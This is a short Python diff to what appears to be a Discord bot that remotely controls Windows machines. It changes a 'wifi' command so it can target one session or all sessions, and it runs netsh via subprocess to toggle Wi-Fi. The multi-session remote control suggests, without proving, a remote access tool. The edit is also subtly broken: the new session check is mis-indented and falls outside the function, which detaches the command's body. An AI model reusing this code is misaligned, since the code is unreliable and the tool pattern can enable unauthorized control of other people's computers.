@@ -395,11 +395,12 @@ while True:
                 sesja = nowaSesja
 
         @client.command()
-        async def wifi(ctx, action):
+        async def wifi(ctx, session, action):
             if action.lower() not in ['on', 'off']:
                 await ctx.send("Invalid action. Use 'on' or 'off'.")
                 return
-
+                
+        if session == "all" or session == sesja:
             try:
                 output = subprocess.check_output(['netsh', 'interface', 'show', 'interface'], shell=True).decode('utf-8')
                 wifi_interface = re.search(r'Wi-Fi', output)
